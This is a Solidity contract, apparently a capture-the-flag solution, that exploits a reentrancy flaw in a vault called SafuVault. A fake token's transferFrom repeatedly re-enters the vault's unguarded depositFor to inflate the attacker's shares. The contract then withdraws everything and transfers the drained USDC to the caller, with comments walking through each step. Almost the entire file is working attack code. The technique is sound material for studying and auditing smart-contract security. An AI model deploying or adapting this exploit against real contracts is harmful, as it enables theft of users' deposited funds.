//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";

interface IVault {
    function depositFor(address token, uint256 _amount, address user) external;
    function withdrawAll() external;
    function balance() external returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

interface IUSDC {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

/**
 * @title SafuVault Reentrancy Exploit
 * @notice Exploits reentrancy vulnerability in SafuVault's depositFor function
 * @dev The vulnerability exists because:
 *      1. depositFor() lacks a nonReentrant modifier (unlike deposit())
 *      2. token parameter in depositFor() is not validated to be the expected USDC
 *      3. By manipulating share price through reentrancy, we can extract more value
 */
contract Solver {
    address public immutable vault;
    address public immutable usdc;

    // Adjustable parameter to control the attack efficiency
    // Higher value = more recursive calls = more profit, but more gas
    uint256 private immutable REENTRANCY_CYCLES = 100;

    // Target balance to prevent infinite recursion
    // This is roughly double the initial funds in the vault
    uint256 private constant TARGET_VAULT_BALANCE = 20_000e18;

    constructor(address _vault, address _usdc) {
        vault = _vault;
        usdc = _usdc;
    }

    /**
     * @notice exploit function
     * @dev Performs a complete attack flow:
     *      1. Trigger reentrancy with initial deposit
     *      2. Withdraw all funds using manipulated shares
     *      3. Transfer exploited funds to the attacker
     */
    function solve() external {

        console2.log("Initial vault balance:", IVault(vault).balance());

        // Begin exploit by calling depositFor with this contract as the token address
        // This will trigger the vault to call our malicious transferFrom function
        IVault(vault).depositFor(address(this), 10_000e18/REENTRANCY_CYCLES, address(this));

        // Log share information
        console2.log("Total vault shares after attack:", IVault(vault).totalSupply());
        console2.log("Our shares:", IVault(vault).balanceOf(address(this)));

        // Withdraw all our funds with artificially inflated shares
        IVault(vault).withdrawAll();

        // Log results
        uint256 drainedAmount = IUSDC(usdc).balanceOf(address(this));
        console2.log("Vault remaining balance:", IVault(vault).balance());
        console2.log("Drained amount:", drainedAmount);

        // Transfer exploited funds to the attacker
        IUSDC(usdc).transfer(msg.sender, drainedAmount);
    }

    /**
     * @notice Malicious implementation of ERC20's transferFrom
     * @dev This is called by the vault during depositFor execution, allowing us to:
     *      1. Make a deposit to the vault to maintain share calculation
     *      2. Re-enter depositFor before the previous call completes
     *      3. Manipulate share price calculation through repeated deposits
     * @param from Source address (ignored in our implementation)
     * @param to Destination address (ignored in our implementation)
     * @param amount Amount to transfer (used as deposit amount for reentrancy)
     */
    function transferFrom(address from, address to, uint256 amount) external {
        // Ensure only the vault can call this function
        require(msg.sender == vault, "Caller is not the vault");

        // Get current vault balance
        uint256 vaultBalance = IVault(vault).balance();

        // Exit condition for recursion
        if (vaultBalance >= TARGET_VAULT_BALANCE) {
            return;
        }

        // Transfer USDC to the vault to simulate a legitimate deposit
        // This is necessary for share price manipulation to work
        IUSDC(usdc).transfer(vault, amount);

        // Call depositFor again, triggering reentrancy
        // Each call increases our shares disproportionately to the actual deposits
        IVault(vault).depositFor(address(this), amount, address(this));
    }
}
